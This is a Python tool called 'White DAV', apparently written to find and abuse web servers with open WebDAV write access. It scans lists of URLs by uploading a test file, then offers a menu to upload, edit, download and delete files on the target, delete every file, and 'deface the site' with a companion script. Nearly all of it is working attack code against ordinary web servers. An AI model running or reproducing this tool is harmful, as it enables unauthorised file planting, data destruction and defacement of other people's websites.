try:
   import os
   import requests
   import subprocess
   from xml.etree import ElementTree as ET
except ImportError:

   exit("install requests and try again ...(pip install requests)")

#---------------------------------------------------------------------------------------------------------
def check_webdav_vulnerability(url, vulnerable_urls):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
    }

    file_content = '<html><body><h1>Test File By white-dav</h1></body></html>'

    try:
        # Test URL with a trailing slash
        url_with_slash = url if url.endswith('/') else url + '/'
        response_with_slash = requests.put(url_with_slash + 'webdav_test.html', headers=headers, data=file_content)

        # Test URL without a trailing slash
        url_without_slash = url.rstrip('/')
        response_without_slash = requests.put(url_without_slash + '/webdav_test.html', headers=headers, data=file_content)

        if response_with_slash.status_code == 201 or response_without_slash.status_code == 201:
            print('\033[32mWebDAV vulnerability found:\033[0m', url)  # Print in green
            vulnerable_urls.append(url)  # Add the vulnerable URL to the list
        else:
            print('\033[31mWebDAV vulnerability not found:\033[0m', url)  # Print in red

        # Clean up the test files
        requests.delete(url_with_slash + 'webdav_test.html', headers=headers)
        requests.delete(url_without_slash + '/webdav_test.html', headers=headers)
    except requests.exceptions.RequestException as e:
        print('\033[33mAn error occurred while testing', url + ':', e, '\033[0m')  # Print in yellow

#---------------------------------------------------------------------------------------------------------
def test_urls_from_file(file_path):
    try:
        with open(file_path, 'r') as file:
            urls = file.readlines()

        vulnerable_urls = []  # List to store the vulnerable URLs

        for url in urls:
            url = url.strip()  # Remove leading/trailing whitespace and newline characters

            if url.startswith('http://') or url.startswith('https://'):
                # Add trailing slash to URL if not present
                if not url.endswith('/'):
                    url += '/'

                check_webdav_vulnerability(url, vulnerable_urls)
            else:
                print('\033[33mInvalid URL format:', url, '\033[0m')  # Print in yellow

        if vulnerable_urls:
            with open('vulnerable.txt', 'w') as file:
                for url in vulnerable_urls:
                    file.write(url + '\n')  # Write the vulnerable URLs to the file

            # Display the count and file name in bold green
            print('\033[1;32m{} URLs found: Saved as \'vulnerable.txt\'\033[0m'.format(len(vulnerable_urls)))
        else:
            print('No vulnerable URLs found.')
    except FileNotFoundError:
        print('\033[33mFile not found:', file_path, '\033[0m')  # Print in yellow
    except IOError as e:
        print('\033[33mError reading the file:', e, '\033[0m')  # Print in yellow

#---------------------------------------------------------------------------------------------------------
def list_directory(url):
    response = requests.request('PROPFIND', url)
    if response.status_code == 207:  # Successful multi-status response
        xml_data = response.content
        namespaces = {'d': 'DAV:'}  # Namespace for DAV properties

        # Parse the XML response and extract directory listing information
        root = ET.fromstring(xml_data)
        resources = root.findall('.//d:response', namespaces)

        print('Directory listing for:', url)
        print("{:<30s} {:<10s} {:<20s}".format(
            'Name', 'Size', 'Last Modified'))

        for resource in resources:
            href = resource.find('.//d:href', namespaces).text
            display_name = resource.find('.//d:displayname', namespaces).text
            content_type = resource.find(
                './/d:getcontenttype', namespaces).text
            content_length = resource.find(
                './/d:getcontentlength', namespaces).text
            last_modified = resource.find(
                './/d:getlastmodified', namespaces).text

            # Ignore the root directory entry
            if href == '/':
                continue

            # Check if it's a collection (directory) or a file
            if content_type == 'httpd/unix-directory':
                size = 'Directory'
            else:
                size = content_length

            print("{:<30s} {:<10s} {:<20s}".format(
                display_name, size, last_modified))

    else:
        print('Failed to retrieve directory listing for:', url)
#---------------------------------------------------------------------------------------------------------

def change_directory(url, directory):
    new_url = url + directory
    return new_url
#---------------------------------------------------------------------------------------------------------

def upload_file(url, file_path):
    file_name = os.path.basename(file_path)
    destination_url = url + file_name

    with open(file_path, 'rb') as file:
        response = requests.put(destination_url, data=file)

    if response.status_code == 201:
        print(f'Successfully uploaded {file_name} to {url}')
    else:
        print(f'Failed to upload {file_name} to {url}')
#---------------------------------------------------------------------------------------------------------

def download_file(url, file_path):
    file_name = os.path.basename(file_path)
    source_url = url + file_name

    response = requests.get(source_url)

    if response.status_code == 200:
        with open(file_path, 'wb') as file:
            file.write(response.content)
        print(f'Successfully downloaded {file_name} from {url}')
    else:
        print(f'Failed to download {file_name} from {url}')
#----------------------------------------------------------------------------------------------------------

def print_working_directory(url):
    response = requests.request('PROPFIND', url)
    if response.status_code == 207:  # Successful multi-status response
        xml_data = response.content
        namespaces = {'d': 'DAV:'}  # Namespace for DAV properties

        # Parse the XML response and extract directory information
        root = ET.fromstring(xml_data)
        resource = root.find('.//d:response', namespaces)

        href = resource.find('.//d:href', namespaces).text

        print("Current Working Directory:", href)

    else:
        print('Failed to retrieve current working directory:', url)

#---------------------------------------------------------------------------------------------------------

def edit_file(url, file_path):
    # Check if the file_path starts with a '/'
    if not file_path.startswith('/'):
        file_path = '/' + file_path

    # Perform the GET request to retrieve the file content
    response = requests.get(url + file_path)

    if response.status_code == 200:
        content = response.text

        # Save the content to a temporary file
        temp_file = '/tmp/edit_file.tmp'
        with open(temp_file, 'w') as f:
            f.write(content)

        # Open the temporary file in Nano for editing
        subprocess.run(['nano', temp_file])

        # Read the modified content from the temporary file
        with open(temp_file, 'r') as f:
            modified_content = f.read()

        # Delete the temporary file
        subprocess.run(['rm', temp_file])

        # Perform the PUT request to update the file with the modified content
        response = requests.put(url + file_path, data=modified_content)

        if response.status_code == 200:
            print("File edited and saved successfully.")
        else:
            print("Failed to edit and save the file.")
    else:
        print("Failed to retrieve the file for editing.")

#---------------------------------------------------------------------------------------------------------

def delete_file(url, file_path):
    # Perform the DELETE request to delete the file
    response = requests.delete(url + file_path)

    # Check if the file still exists
    exists = check_file_exists(url, file_path)

    if exists:
        print("Failed to delete the file.")
    else:
        print("File deleted successfully.")
#=-=-=-=-=-=-=-=-=-=--=-=-=-=-==-=--=--=-=-=-=-=-=--=-=

def check_file_exists(url, file_path):
    # Perform a HEAD request to check if the file exists
    response = requests.head(url + file_path)

    return response.status_code == 200
#----------------------------------------------------------------------------------------------------------

def delete_directory(url, directory_path):
    # Perform the DELETE request to delete the directory
    response = requests.delete(url + directory_path)

    # Check if the directory still exists
    exists = check_directory_exists(url, directory_path)

    if exists:
        print("Failed to delete the directory.")
    else:
        print("Directory deleted successfully.")
#=-=-=-=-=-=-=-==-==-=-=-=-=-=-=-=-=-=--=--=--=-=--==-==-=--=-=-

def check_directory_exists(url, directory_path):
    # Perform a PROPFIND request to check if the directory exists
    response = requests.request('PROPFIND', url + directory_path)

    return response.status_code == 207
#---------------------------------------------------------------------------------------------------------

def copy_file(url, source_path, destination_path):
    # Perform the COPY request to copy the file
    headers = {'Destination': url + destination_path}
    response = requests.request('COPY', url + source_path, headers=headers)


    if response.status_code == 201 or response.status_code == 204:
        print("File copied successfully.")
    else:
        print("File not copied !")
#---------------------------------------------------------------------------------------------------------

def get_version(url):
    response = requests.request('OPTIONS', url)

    if response.status_code == 200:
        server_header = response.headers.get('server')
        supported_methods = response.headers.get('allow')

        print('Server Version:', server_header)
        print('Supported Methods:', supported_methods)
        print('Server Details:\n')
        print(response.text)
        print(" ")
        print(" ")
        print(response.headers)

    else:
        print('Failed to retrieve server version.')

#------------------------------------------------------------------------------------------------------------
def delete_all_files(url):
    # Get the directory listing
    response = requests.request('PROPFIND', url)
    if response.status_code == 207:  # Successful multi-status response
        xml_data = response.content
        namespaces = {'d': 'DAV:'}  # Namespace for DAV properties

        # Parse the XML response and extract file paths
        root = ET.fromstring(xml_data)
        resources = root.findall('.//d:response', namespaces)

        for resource in resources:
            href = resource.find('.//d:href', namespaces).text

            # Ignore the root directory entry
            if href == '/':
                continue

            # Delete each file
            delete_file(url, href)

        print("All files deleted successfully.")
    else:
        print('Failed to retrieve directory listing for:', url)


def delete_files_separated(url, file_paths):
    paths = file_paths.split(',')

    for file_path in paths:
        delete_file(url, file_path.strip())

    print("Selected files deleted successfully.")
#----------------------------------------------------------------------------------------------------------
def main_menu():

    while True:
        print("""
 __        ___     _ _         ____    ___     __
 \ \      / / |__ (_) |_ ___  |  _ \  / \ \   / /
  \ \ /\ / /| '_ \| | __/ _ \ | | | |/ _ \ \ / / 
   \ V  V / | | | | | ||  __/ | |_| / ___ \ V /
    \_/\_/  |_| |_|_|\__\___| |____/_/   \_\_/ 
   \033[1;31mThe WebDav Testing Script       AUTH: WH1T3'\033[0m
        \033[33m
█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
█                                     𝗠𝗘𝗡𝗨                                                                    
█=====================================================================================█
█ 1.  Test url for Webdav vulnerability | 9.  Delete File                             █
█ 2.  Test multiple url from file       | 10. Delete Directory                        █
█ 3.  List all Directories		| 11. Copy File		                      █
█ 4.  Change Directory			| 12. Get Server details                      █
█ 5.  Upload File			| 13. Delete all files                        █
█ 6.  Download File			| 14. Delete specic files(seperated by commas)█
█ 7.  Print Working Directory		| 15. Deface the site                         █
█ 8.  Edit File				| 16. Script and Devoloper info               █
█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
\033[0m
        """)

        choice = input("\033[1m\033[33;32m[+] Select an option number from the above menu >\033[0m ")
        if choice == '1':
            url = input('Enter the URL with http:// > ').strip()
            vulnerable_urls = []  # Create an empty list to store vulnerable URLs
            check_webdav_vulnerability(url, vulnerable_urls)  # Pass the list as an argument
            if vulnerable_urls:
               print('\033[32mWebDAV vulnerability found:\033[0m', url)
            else:
               print('\033[31mWebDAV vulnerability not found:\033[0m', url)
        elif choice == '2':
            file_path = input("Enter the file path containing URLs: ")
            test_urls_from_file(file_path)
        elif choice == '3':
            url = input("Enter the URL: ")
            list_directory(url)
        elif choice == '4':
            url = input("Enter the URL: ")
            directory = input("Enter the directory name: ")
            url = change_directory(url, directory)
            list_directory(url)
        elif choice == '5':
            url = input("Enter the URL: ")
            file_path = input("Enter the file path: ")
            upload_file(url, file_path)
        elif choice == '6':
            url = input("Enter the URL: ")
            file_path = input("Enter the file path: ")
            download_file(url, file_path)
        elif choice == '7':
            url = input("Enter the URL: ")
            print_working_directory(url)
        elif choice == '8':
            url = input("Enter the URL: ")
            file_path = input("Enter the file path: ")
            edit_file(url, file_path)
        elif choice == '9':
            url = input("Enter the URL: ")
            file_path = input("Enter the file path: ")
            delete_file(url, file_path)
        elif choice == '10':
            url = input("Enter the URL: ")
            directory_path = input("Enter the directory path: ")
            delete_directory(url, directory_path)
        elif choice == '11':
            url = input("Enter the URL: ")
            source_path = input("Enter the source file path: ")
            destination_path = input("Enter the destination file path: ")
            copy_file(url, source_path, destination_path)
        elif choice == '12':
    	    url = input("Enter the URL: ")
    	    get_version(url)

        elif choice == '13':
            #write the function to delete at once
            url = input("Enter the URL: ")
            delete_all_files(url)
        elif choice == "14":
            #write function for deleting files seperated by commas
            url = input("Enter the URL: ")
            file_paths = input("Enter the file paths separated by commas: ")
            delete_files_separated(url, file_paths)
        elif choice == "15":
            print("""
    \033[32m================================================================\033[0m
    \033[32mTool devoloped  : WH1T3'\033[0m
    \033[33mThere is a file called white-deface.py in this directory.\033[0m
    \033[33mYou can see it by typing ls.\033[0m
    \033[33mRun that file as python white-deface.py and follow the steps to deface site.\033[0m
    \033[32m================================================================\033[0m
    """)
        elif choice == "16":
            print("""
    \033[32m================================================================\033[0m
    \033[32mTool devoloped  : WHITE L'\033[0m
    \033[33mGithub 	    : https://github.com/WH1T3-E4GL3/\033[0m
    \033[33mTelegram        : https://t.me/Ka_KsHi_HaTaKe\033[0m
    \033[33mInstagram       : https://www.instagram.com/_vladimir_putin.___/\033[0m
    \033[32m================================================================\033[0m
            
            
           \033[32mWhite DAV - WebDAV Vulnerability Checker

The WebDAV Vulnerability Checker is a powerful tool designed to help individuals and organizations assess the security of their web servers and identify potential vulnerabilities related to the WebDAV (Web Distributed Authoring and Versioning) protocol. WebDAV is an extension of the HTTP protocol that allows users to collaboratively edit and manage files on remote web servers.

With the WebDAV Vulnerability Checker, you can easily test your web server or a list of URLs to determine if they are vulnerable to WebDAV-based attacks. The tool performs a series of tests by creating test files on the target server using the WebDAV protocol and then checking the server's response. Based on the response, it determines if the server is susceptible to WebDAV vulnerabilities.


YOU NEED TO PUT THE URLS IN THE CORRECT FORMAT LIKE 'http://example.com/' or 'http://example.com' . SOMETIMES IT SHOW NOT VULNERABLE WHEN WE USE /, SO TRY TO USE / AND IF IT SHOWS NOT VULNERABLE USE THE SLASH.
\033[0m""")
        else:
            print("Invalid choice. Please try again.\n")


# Execute the main_menu() function when the module is imported
main_menu()

